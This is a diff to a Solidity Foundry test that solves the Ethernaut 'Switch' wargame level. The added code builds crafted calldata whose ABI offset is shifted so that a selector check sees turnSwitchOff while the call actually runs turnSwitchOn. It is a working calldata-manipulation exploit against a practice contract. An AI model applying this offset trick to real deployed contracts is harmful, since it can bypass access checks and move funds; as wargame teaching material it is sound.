@@ -8,6 +8,7 @@ import {Switch} from "src/levels/Switch.sol";
 import {SwitchFactory} from "src/levels/SwitchFactory.sol";
 import {Level} from "src/levels/base/Level.sol";
 import {Ethernaut} from "src/Ethernaut.sol";
+import {Address} from "openzeppelin-contracts-v5.4.0/utils/Address.sol";
 
 contract TestSwitch is Test, Utils {
     Ethernaut ethernaut;
@@ -58,5 +59,23 @@ contract TestSwitch is Test, Utils {
 
     /// @notice Test the solution for the level.
     function testSolve() public checkSolvedByPlayer{
+        bytes memory data = abi.encodePacked(
+            instance.flipSwitch.selector,
+            uint256(0x60),
+            type(uint256).max,
+            bytes32(instance.turnSwitchOff.selector),
+            uint256(0x4),
+            bytes32(instance.turnSwitchOn.selector)
+        );
+//        bytes memory data = abi.encodePacked(
+//            instance.flipSwitch.selector,
+//            uint256(0x44),
+//            type(uint256).max,
+//            instance.turnSwitchOff.selector,
+//            uint256(0x4),
+//            instance.turnSwitchOn.selector
+//        );
+        console.logBytes(data);
+        Address.functionCall(address(instance), data);
     }
 }
